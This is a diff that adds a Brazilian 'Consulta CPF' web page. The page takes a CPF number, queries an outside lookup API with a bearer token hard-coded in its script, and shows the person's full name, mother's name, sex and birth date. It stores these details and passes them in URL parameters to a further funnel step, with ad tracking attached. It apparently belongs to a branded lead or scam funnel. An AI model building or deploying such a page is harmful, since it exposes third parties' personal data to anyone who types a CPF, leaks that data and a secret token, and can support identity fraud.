@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Consulta CPF</title>
+  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+
+  <!-- UTMify + Pixel (como no seu HTML) -->
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+  <script>
+    window.pixelId = "680465d10b6ade7f0dfbd4ab";
+    (function(){
+      var a = document.createElement("script");
+      a.async = true; a.defer = true;
+      a.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
+      document.head.appendChild(a);
+    })();
+  </script>
+
+  <style>
+    :root{ --brand:#FFE600; --brand-dk:#e6cf00; --ink:#1c1c1c; --bg:#f2f2f2; }
+    *{ box-sizing:border-box }
+    body{ margin:0; font-family:'Sora',system-ui,-apple-system,Segoe UI,Roboto,Arial; background:var(--bg); color:#333 }
+    .header{ display:flex; align-items:center; padding:10px; border-bottom:1px solid #aa9900; background:var(--brand) }
+    .header img{ width:125px; padding:10px }
+    .content{ margin:20px 15px 30px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,.1); background:#fff; padding:10px 20px 30px }
+    h1{ font-size:16px; margin:10px 0 20px }
+    label{ font-size:16px; color:#666; display:block; margin-bottom:10px }
+    .cpf-input{ width:100%; padding:15px; font-size:16px; border:1px solid #ccc; border-radius:5px; margin-bottom:20px }
+    .button,.button2{ width:100%; padding:15px 30px; border-radius:10px; border:0; font-weight:700; font-size:16px; cursor:pointer; background:var(--brand); color:var(--ink) }
+    .button:hover,.button2:hover{ background:var(--brand-dk) }
+    .notification-card{ display:none; align-items:center; background:#ffeded; border:1px solid #ff5252; color:#ff5252; padding:15px 20px; border-radius:8px; margin-bottom:20px }
+    .notification-card i{ margin-right:10px; font-size:18px }
+    .ok{ text-align:center; margin:20px 0 }
+    .ok h3{ color:#4CAF50; margin:10px 0 }
+    .card-row{ background:#f5f5f5; border-radius:8px; padding:15px; margin-bottom:12px; box-shadow:0 1px 3px rgba(0,0,0,.08); display:flex; align-items:center }
+    .card-row i{ color:#3483fa; font-size:20px; margin-right:15px }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img id="brandLogo" src="images/logo.png" alt="Logo" loading="eager" decoding="async" onerror="this.onerror=null; this.src='logo.png';" />
+  </div>
+
+  <div class="content">
+    <!-- Etapa 1 -->
+    <div id="primeiraParte">
+      <h1>Preencha seus dados para consulta</h1>
+      <label for="cpf">CPF</label>
+      <input type="text" id="cpf" class="cpf-input" placeholder="000.000.000-00" maxlength="14" />
+
+      <div id="notification" class="notification-card">
+        <i class="fas fa-exclamation-circle"></i>
+        <span id="notification-message"></span>
+      </div>
+
+      <button class="button2" id="consultarBtn">Continuar</button>
+    </div>
+
+    <!-- Resultado -->
+    <div id="resultadoModal" style="display:none">
+      <div class="ok">
+        <svg width="40" height="40" viewBox="0 0 40 40" aria-hidden="true">
+          <circle cx="20" cy="20" r="19" fill="#4CAF50" stroke="#45a049" stroke-width="2"/>
+          <path d="M12 20l6 6 12-12" stroke="white" stroke-width="3" fill="none"/>
+        </svg>
+        <h3>Dados encontrados com sucesso!</h3>
+      </div>
+
+      <div id="dadosContainer">
+        <div class="card-row">
+          <i class="fas fa-user"></i>
+          <div>
+            <div style="color:#666;font-size:13px">Nome completo</div>
+            <div id="nomeResult" style="color:#333;font-size:15px;font-weight:600"></div>
+          </div>
+        </div>
+
+        <div id="maeContainer" class="card-row">
+          <i class="fas fa-female"></i>
+          <div>
+            <div style="color:#666;font-size:13px">Nome da mãe</div>
+            <div id="maeResult" style="color:#333;font-size:15px;font-weight:600"></div>
+          </div>
+        </div>
+
+        <div class="card-row">
+          <i class="fas fa-venus-mars"></i>
+          <div>
+            <div style="color:#666;font-size:13px">Sexo</div>
+            <div id="sexoResult" style="color:#333;font-size:15px;font-weight:600"></div>
+          </div>
+        </div>
+
+        <div class="card-row">
+          <i class="fas fa-calendar"></i>
+          <div>
+            <div style="color:#666;font-size:13px">Data de nascimento</div>
+            <div id="nascimentoResult" style="color:#333;font-size:15px;font-weight:600"></div>
+          </div>
+        </div>
+      </div>
+
+      <button class="button" id="continuarBtn">Continuar</button>
+    </div>
+  </div>
+
+  <script>
+  (function(){
+    // ===== CONFIG =====
+    const API_BASE = 'https://encurtaapi.com/api/typebot';
+    const API_TOKEN = 'Bearer 4d65acfcd1da251426d90daa55184843e41e18cb6e331f20a3a1a7ec54ab677e'; // fornecida por você
+    const NEXT_URL = '../6/index.html'; // ajuste se o passo 6 estiver em outro path
+
+    // ===== DOM =====
+    const $ = (id) => document.getElementById(id);
+    const inputCPF = $('cpf');
+    const btnConsultar = $('consultarBtn');
+    const primeiraParte = $('primeiraParte');
+    const modal = $('resultadoModal');
+    const continuarBtn = $('continuarBtn');
+
+    // ===== UI helpers =====
+    function showNotification(message){
+      const n = $('notification');
+      const m = $('notification-message');
+      if(!n||!m){ alert(message); return; }
+      m.textContent = message; n.style.display = 'flex';
+      clearTimeout(n.__t); n.__t = setTimeout(()=>{ n.style.display='none'; }, 3000);
+    }
+
+    // ===== CPF mask + validação =====
+    function validarCPF(cpf){
+      cpf = cpf.replace(/\D/g,'');
+      if (cpf.length !== 11) return false;
+      if (/^(\d)\1{10}$/.test(cpf)) return false;
+      let soma=0, resto;
+      for(let i=1;i<=9;i++) soma += parseInt(cpf.substring(i-1,i))*(11-i);
+      resto = (soma*10)%11; if (resto===10||resto===11) resto=0;
+      if (resto !== parseInt(cpf.substring(9,10))) return false;
+      soma=0;
+      for(let i=1;i<=10;i++) soma += parseInt(cpf.substring(i-1,i))*(12-i);
+      resto = (soma*10)%11; if (resto===10||resto===11) resto=0;
+      return resto === parseInt(cpf.substring(10,11));
+    }
+
+    function maskCPF(v){
+      v = v.replace(/\D/g,'');
+      if (v.length>0) v = v.replace(/^(\d{3})(\d)/,'$1.$2');
+      if (v.length>6) v = v.replace(/^(\d{3})\.(\d{3})(\d)/,'$1.$2.$3');
+      if (v.length>9) v = v.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/,'$1.$2.$3-$4');
+      return v.slice(0,14);
+    }
+
+    inputCPF?.addEventListener('input', (e)=>{
+      const pos = e.target.selectionStart;
+      e.target.value = maskCPF(e.target.value);
+      e.target.selectionStart = e.target.selectionEnd = e.target.value.length;
+    });
+
+    inputCPF?.addEventListener('keydown', (e)=>{ if (e.key==='Enter') btnConsultar?.click(); });
+
+    // ===== UTMs =====
+    function captureUTMsOnce(){
+      const qs = new URLSearchParams(location.search);
+      if (![...qs.keys()].length) return;
+      const stored = JSON.parse(localStorage.getItem('urlParams')||'{}');
+      const merged = { ...stored };
+      qs.forEach((v,k)=> merged[k]=v);
+      localStorage.setItem('urlParams', JSON.stringify(merged));
+    }
+    captureUTMsOnce();
+
+    // ===== Fetch com timeout =====
+    function fetchWithTimeout(resource, options={}){
+      const { timeout=4000, ...rest } = options;
+      const controller = new AbortController();
+      const id = setTimeout(()=> controller.abort(), timeout);
+      return fetch(resource, { ...rest, signal: controller.signal }).finally(()=> clearTimeout(id));
+    }
+
+    // ===== Render modal =====
+    function renderResultadoModal(d){
+      const setText = (id, v) => { const el=$(id); if (el) el.textContent = v||''; };
+      setText('nomeResult', d.NOME);
+      if ($('maeContainer')){
+        if (d.MAE && d.MAE.trim()) { setText('maeResult', d.MAE); $('maeContainer').style.display='flex'; }
+        else { $('maeContainer').style.display='none'; }
+      }
+      setText('sexoResult', d.SEXO);
+      setText('nascimentoResult', d.NASCIMENTO);
+      primeiraParte.style.display='none';
+      modal.style.display='block';
+    }
+
+    // ===== Redirecionar juntando UTMs + dados =====
+    function redirectNext({ cpf, dadosUsuario, origem='api' }){
+      const originalParams = JSON.parse(localStorage.getItem('urlParams')||'{}');
+      const finalParams = { ...originalParams };
+      if (cpf) finalParams.document = cpf;
+      if (dadosUsuario?.NOME) finalParams.name = dadosUsuario.NOME;
+
+      const userData = {
+        document: cpf||'',
+        name: dadosUsuario?.NOME||'',
+        mae: dadosUsuario?.MAE||'',
+        sexo: dadosUsuario?.SEXO||'',
+        nascimento: dadosUsuario?.NASCIMENTO||''
+      };
+      localStorage.setItem('userData', JSON.stringify(userData));
+
+      const url = new URL(NEXT_URL, window.location.href);
+      Object.keys(finalParams).forEach(k=> url.searchParams.append(k, finalParams[k]));
+      url.searchParams.append('lookup', origem);
+      window.location.href = url.toString();
+    }
+
+    // ===== Consultar =====
+    btnConsultar?.addEventListener('click', async ()=>{
+      const raw = inputCPF?.value||'';
+      const cpf = raw.replace(/\D/g,'');
+      if (!validarCPF(cpf)) { showNotification('Por favor, insira um CPF válido'); return; }
+
+      btnConsultar.disabled = true; const original = btnConsultar.innerHTML;
+      btnConsultar.innerHTML = "<i class='fas fa-spinner fa-spin' style='margin-right:8px'></i>Realizando consulta";
+
+      const url = `${API_BASE}?cpf=${encodeURIComponent(cpf)}`;
+      try{
+        const res = await fetchWithTimeout(url, {
+          timeout: 4000,
+          headers: { 'Authorization': API_TOKEN, 'Accept': 'application/json' }
+        });
+        const status = res.status;
+        const text = await res.text();
+        let data = null; if (text && text.trim()) { try{ data = JSON.parse(text); } catch{ data=null; } }
+        if (!res.ok){
+          if (status===404){ showNotification('CPF não encontrado'); return; }
+          throw new Error(`HTTP ${status}`);
+        }
+        const payload = (data && (data.result || data.data || data)) || {};
+        const pick = (kArr) => {
+          for (const k of kArr){ if (typeof payload[k] === 'string' && payload[k].trim()) return payload[k]; }
+          return '';
+        };
+        const dadosUsuario = {
+          NOME: pick(['NOME','nome','name']),
+          MAE: pick(['MAE','mae','mae_nome']),
+          SEXO: pick(['SEXO','sexo']),
+          NASCIMENTO: pick(['NASCIMENTO','nascimento','birthdate','data_nascimento'])
+        };
+        localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
+        renderResultadoModal(dadosUsuario);
+      }
+      catch(err){
+        console.error('[API ERRO]', err);
+        showNotification('Erro ao consultar CPF. Tente novamente.');
+      }
+      finally{
+        btnConsultar.disabled = false; btnConsultar.innerHTML = original;
+      }
+    });
+
+    // Continuar -> próxima etapa
+    continuarBtn?.addEventListener('click', (e)=>{
+      e.preventDefault();
+      const cpf = (inputCPF?.value||'').replace(/\D/g,'');
+      const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')||'{}');
+      redirectNext({ cpf, dadosUsuario, origem:'api' });
+    });
+  })();
+  </script>
+</body>
+</html>
